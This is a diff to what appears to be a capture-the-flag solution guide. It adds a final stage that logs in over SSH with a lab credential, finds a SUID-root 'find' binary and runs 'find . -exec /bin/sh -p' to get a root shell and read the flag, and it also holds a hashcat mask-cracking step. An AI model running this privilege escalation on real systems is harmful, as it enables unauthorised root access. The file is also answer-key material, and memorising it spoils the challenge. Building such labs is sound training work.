@@ -55,6 +55,16 @@ cracks with a 6-hex mask (`hashcat -a 3 -m 0 ... ?h?h?h?h?h?h`, or John
 `--mask`) to the S5 token; wrap it as `CPAY{S5_vault_<token>}`.
 → hands off: `svc-deploy : Bl@ckout#Deploy1`.
 
+**S6 — vulnerable Linux/SSH box (`s6_linux`).** SSH in with the S5 credential:
+`ssh svc-deploy@<host> -p 2226`. Enumerate (manually or with linpeas) and find
+the SUID-root `find`:  `find / -perm -4000 -type f 2>/dev/null` lists it. Exploit
+it (GTFOBins) to become root and read the flag:
+```
+find . -exec /bin/sh -p \; -quit      # euid-root shell
+cat /root/flag.txt                     # CPAY{S6_root_...}
+```
+This is the capstone — no further hand-off.
+
 ## Tooling notes
 - S2 embedding needs OpenStego (Java). The build machine's OpenStego version
   produces the box's `network_diagram.png`; participants extract with the same
